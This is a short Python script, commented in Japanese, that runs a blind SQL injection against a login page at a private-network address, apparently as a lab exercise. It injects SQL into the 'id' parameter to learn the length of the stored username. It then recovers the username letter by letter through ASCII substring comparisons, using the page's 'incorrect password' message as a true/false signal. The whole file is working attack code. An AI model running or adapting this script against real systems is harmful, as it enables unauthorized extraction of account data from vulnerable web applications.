import requests

url = 'http://172.16.1.105/login_check.php'
length_id = 0 #IDの長さを保存する変数
string_id = "" #IDを保存する変数

while True: #IDの長さが20桁まで検証
    length_id=length_id+1 #1桁ずつ増やす
    sql = "' or char_length(username) = %s; #" % length_id #データベースのusername行の長さをチェックするSQL文を入れる
    para = {'id': sql, 'pw': '1'} #getパラメータにidは上記のSQLを、パスワードには適当に1を入れる
    send = requests.get(url,params=para) #パケットを送信する
    status_code = send.status_code #サーバの応答コードを変数に保存する
    if status_code != 200 : #ステータスが200じゃない場合、エラーを表示して中止する
        print("ステータスエラーです。")
        break
    #本文に「パスワードが正しくありません。」の内容が表示されるとIDの長さが合っているので長さを表示させる
    if "パスワードが正しくありません。" in send.text:
        print("IDは%d桁です。" % length_id)
        break
for len in range(1,length_id+1):
    for ascii in range(97,123): #小文字a~zのASCIIコードをループさせる
        #データベースに保存されている文字列と長さを比較してTueを探す
        sql = "' or ascii(substring(username,{},1)) = {} AND char_length(username) = {}; #".format(len,ascii,length_id)
        para = {'id': sql, 'pw': '1'}  #getパラメータにidは上記のSQLを、パスワードには適当に1を入れる
        send = requests.get(url, params=para)  #パケットを送信する
        status_code = send.status_code
        if status_code != 200 : #ステータスが200じゃない場合、エラーを表示して中止する
            print("ステータスエラーです。")
            break
        #本文に「パスワードが正しくありません。」の内容が表示されるとIDの長さや文字列が合っているので変数に保存する
        if "パスワードが正しくありません。" in send.text:
            string_id+=chr(ascii) #string_idの変数にASCIIコードをCHARデータがたで保存する

print("データベースに保存されいているID：%s" % string_id)
